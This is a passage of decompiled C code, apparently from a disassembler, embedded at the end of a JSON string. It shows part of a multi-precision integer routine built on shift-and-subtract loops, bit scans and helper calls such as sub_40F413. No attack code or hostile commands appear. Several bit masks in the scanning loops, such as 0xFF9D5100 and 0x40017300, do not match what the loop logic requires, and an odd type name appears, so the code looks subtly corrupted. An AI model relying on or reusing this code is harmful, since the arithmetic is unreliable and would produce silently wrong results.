{\nLABEL_116:\n          v68 = v67 & -v67;\n          for ( m = 0; (v68 & 0xFF9D5100) == 0; m += 8 )\n            v68 <<= 8;\n          if ( v68 >= 0 )\n          {\n            do\n            {\n              ++m;\n              v22 = (v68 & 0x40017300) != 0;\n              v68 *= 2;\n            }\n            while ( !v22 );\n          }\n          v70 = 32 * v66 - m + 31;\n        }\n        else\n        {\n          while ( ++v66 )\n          {\n            v67 = *((_DWORD *)lpMem + v66);\n            if ( v67 )\n              goto LABEL_116;\n          }\n          v70 = -1;\n        }\n        sub_407B82(&v113, (int)&v113, v70);\n        sub_40D85F(&v122, (int)&v122, v70);\n        sub_40D85F(&v119, (int)&v119, v70);\n        v12 = v120;\n        v130 += v70;\n        v15 = v123;\n        v42 = (int)v133;\n        v43 = v132;\n      }\n      else\n      {\n        if ( (v44 ^ v42) < 0 )\n          v51 = sub_40EBB8(&Mem, (int)&Mem, (int)&v113);\n        else\n          v51 = sub_40F413(&Mem, (int)&Mem, (int)&v113);\n        if ( v117 < 0 )\n          v51 = -v51;\n        v117 = v51;\n        if ( (v15 ^ v43) < 0 )\n          v56 = sub_40F413(&v122, (int)&v122, (int)&v107);\n        else\n          v56 = sub_40EBB8(&v122, (int)&v122, (int)&v107);\n        v15 = v56;\n        if ( v123 < 0 )\n          v15 = -v56;\n        v123 = v15;\n        if ( ((v12 ^ (unsigned int)v131) & 0x801FB100) != 0 )\n          v57 = sub_40F413(&v119, (int)&v119, (int)&v110);\n        else\n          v57 = sub_40EBB8(&v119, (int)&v119, (int)&v110);\n        v12 = v57;\n        if ( v120 < 0 )\n          v12 = -v57;\n        v58 = 0;\n        v120 = v12;\n        v59 = *v118;\n        if ( *v118 )\n        {\nLABEL_91:\n          v60 = v59 & -v59;\n          for ( n = 0; (v60 & 0xFF9D5100) == 0; n += 8 )\n            v60 <<= 8;\n          if ( v60 >= 0 )\n          {\n            do\n            {\n              ++n;\n              v22 = (v60 & 0x40017300) != 0;\n              v60 *= 2;\n            }\n            while ( !v22 );\n          }\n          v62 = 32 * v58 - n + 31;\n        }\n        else\n        {\n          while ( ++v58 )\n          {\n            v59 = v118[v58];\n            if ( v59 )\n              goto LABEL_91;\n          }\n          v62 = -1;\n        }\n        sub_407B82(&Mem, (int)&Mem, v62);\n        sub_40D85F(&v107, (int)&v107, v62);\n        sub_40D85F(&v110, (int)&v110, v62);\n        v42 = v117;\n        v130 += v62;\n        v131 = (LP3DB7)v111;\n        v43 = v108;\n        v133 = (char *)v117;\n        v132 = v108;\n      }\n    }\n    v52 = ~v114;\n    v53 = (char *)v118 - (_BYTE *)lpMem;\n    v127 = (char *)v118 - (_BYTE *)lpMem;\n    v54 = (unsigned int *)((char *)lpMem + 4 * ~v114);\n    while ( 1 )\n    {\n      v55 = *(unsigned int *)((char *)v54 + v53);\n      v50 = *v54 < v55;\n      if ( *v54 != v55 )\n        goto LABEL_74;\n      v53 = v127;\n      --v54;\n      if ( --v52 < 0 )\n        goto LABEL_64;\n    }\n  }\n  v9 = (v7 > 0) - ((unsigned int)v7 >> 31);\n  if ( a1 != a4 )\n    sub_40C928(a1, a4);\n  result = (int *)abs32(a1[1]);\n  a1[1] = (int)result;\n  if ( a2 )\n  {\n    if ( v9 < 0 )\n    {\n      result = (int *)a2[2];\n      a2[1] = -1;\n      *result = -v9;\n    }\n    else\n    {\n      if ( !v9 )\n      {\nLABEL_5:\n        a2[1] = 0;\n        return result;\n      }\n      result = (int *)a2[2];\n      a2[1] = 1;\n      *result = v9;\n    }\n  }\n  return result;\n}\n\n"
    }
]